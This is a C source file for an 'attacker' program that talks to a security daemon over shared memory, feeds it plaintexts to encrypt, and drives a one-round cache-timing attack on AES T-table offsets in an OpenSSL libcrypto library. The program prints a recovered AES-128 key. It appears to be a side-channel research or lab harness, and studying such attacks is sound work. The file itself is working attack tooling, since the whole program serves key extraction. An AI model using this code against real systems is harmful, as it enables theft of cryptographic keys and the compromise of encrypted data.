#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <one_round_attack.h>
#include "ipc.h"

/* one_round_attack context */
static struct one_round_attack_ctx attack_ctx;

/* IPC with security daemon */
static int ipc_fd;
static void *addr;
static struct shm_msg *client_msg;
static struct shm_msg *server_msg;

static int security_daemon_connect(void)
{	
	/* get shm */
    if((ipc_fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
        printf("shm_open error : %s\n", strerror(errno));
        return -1;
    }
	
	/* mmap */
    addr = mmap(NULL, MSG_SIZE_MAX, PROT_READ | PROT_WRITE, MAP_SHARED, ipc_fd, 0);
    if(addr == MAP_FAILED) {
        printf("mmap error : %s\n", strerror(errno));
        goto out;
    }
	
	client_msg = (struct shm_msg *)((char*)addr + SHM_CLIENT_BUF_IDX);
    server_msg = (struct shm_msg *)((char*)addr + SHM_SERVER_BUF_IDX);
	
	return 0;

out:
	/* close shm */
    if(munmap(addr, MSG_SIZE_MAX) == -1) {
        printf("munmap error : %s\n", strerror(errno));
	}
    if(close(ipc_fd) == -1) {
        printf("close error : %s\n", strerror(errno));
    }
	
	return -1;
}

static int security_daemon_encrypt_msg(U8 *in, U8 *out, int size)
{
	/* prepare msg */
	client_msg->status = 0;
	client_msg->len = size;
	
	/* send msg */
	memcpy(client_msg->msg, in, client_msg->len);
	client_msg->status = 1;
	
	/* read reply */
	while(1) {
		if(server_msg->status == 1) {	
			memcpy(out, server_msg->msg, server_msg->len);
			server_msg->status = 0;
			break;
		}
		sleep(0);
	}
	
	return 0;
}

static void security_daemon_disconnect(void)
{
	/* send end msg */
	client_msg->status = 0;
	client_msg->len = sizeof(END_MSG) + AES128_KEY_LEN;
	strncpy(client_msg->msg, END_MSG, client_msg->len);
	memcpy(client_msg->msg + sizeof(END_MSG), attack_ctx.result.predict_key, AES128_KEY_LEN);
	client_msg->status = 1;
	
	/* close shm */
	if(munmap(addr, MSG_SIZE_MAX) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(ipc_fd) == -1) {
		printf("close error : %s\n", strerror(errno));
	}
}

/**
 * Util Functions
 */
static void string_to_hex(U8 *pIn, unsigned int pInLen, U8 *pOut)
{
    unsigned int i, j;
    unsigned int mul;
    char data = 0;

    for(i=0, j=0; i<pInLen; i++) {
        if(i % 2 == 0)
            mul = 16;
        else
            mul = 1;

        if(pIn[i] >= '0' && pIn[i] <= '9')
            data += ((pIn[i] - 48) * mul);
        else if(pIn[i] >= 'a' && pIn[i] <= 'f')
            data += ((pIn[i] - 87) * mul);
        else if(pIn[i] >= 'A' && pIn[i] <= 'F')
            data += ((pIn[i] - 55) * mul);
        else
            return;

        if(mul == 1)
        {
            pOut[j] = data;
            data = 0;
            j++;
        }
    }
}

static void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned int *pOut)
{
    /* HexString must be Big-Endian!! */
    int is_little_endian = 0;
    unsigned int test = 0x10000001;
    char *ptr = (char*)&test;

    if(ptr[0] == 0x01)
    {
        is_little_endian = 1;
    }
    if(pInLen != sizeof(unsigned int) * 2)
    {
        return;
    }
    string_to_hex((unsigned char*)pIn, pInLen, (char*)pOut);

    if(is_little_endian)
    {
        char tmp;
        unsigned int i, j;

        ptr = (char*)pOut;
        for(i=0, j=sizeof(unsigned int)-1; i<sizeof(unsigned int); i++, j--)
        {
            if(i > j)
            {
                break;
            }
            tmp = ptr[i];
            ptr[i] = ptr[j];
            ptr[j] = tmp;
        }
    }
} 

static void set_one_round_attack_args(char **argv)
{
	struct one_round_attack_args *args = &attack_ctx.args;
	
	/* set arguments */
	args->plain_text_cnt = atoi(argv[1]);
	args->cache_attack_repeat_cnt = atoi(argv[2]);
	args->cpu_cycle_threshold = atoi(argv[3]);
	hex_string_to_int(argv[4], strlen(argv[4]), &args->off_te0);
	hex_string_to_int(argv[5], strlen(argv[5]), &args->off_te1);
	hex_string_to_int(argv[6], strlen(argv[6]), &args->off_te2);
	hex_string_to_int(argv[7], strlen(argv[7]), &args->off_te3);
	
	args->cache_line_size = 64;
	sprintf(args->crypto_lib, "%s", argv[8]);
	sprintf(args->plaintext_file, "%s", "./plain.txt");
	
	/* set encrypt callback function */
	attack_ctx.encrypt = security_daemon_encrypt_msg;
}

int main(int argc, char **argv)
{
	int i, r, limit_cnt, repeat_cnt;
	
	if(argc != 9) {
		printf("USAGE : ./attacker <limit plain text count> <repeat count for a plaintext> <cpu cycle threshold> <offset te0> <offset te1> <offset te2> <offset te3> <crypto library path>\n");
		printf("EXAMPLE : ./attacker 1000 1 200 0010dca8 0010e0a8 0010e4a8 0010d8a8 /usr/lib/libcrypto.so.1.0.0\n");
		return 0;
	}
	
	/* 1. Initialize */
	r = security_daemon_connect();
	if(r) {
		printf("security_daemon_connect error\n");
		return 0;
	}
	printf("security_daemon_connect success\n");
	
	/* 2. Set one_round_attack args */
	set_one_round_attack_args(argv);
	
	/* 3. Initialize one_round_attack ctx */
	r = one_round_attack_init(&attack_ctx);
	if(r) {
		printf("one_round_attack_init error : %d\n", r);
		return 0;
	}
	
	/* 4. Do one_round_attack */
	one_round_attack_do_attack(&attack_ctx);
	
	/* 5. Print Reuslt */
	printf("predict key : ");
	for(i=0; i<16; i++)
		printf("%02x", attack_ctx.result.predict_key[i]);
	printf("\n");
	
	/* 6. Finalize */
	one_round_attack_finalize(&attack_ctx);
	security_daemon_disconnect();
	
	return 0;
}
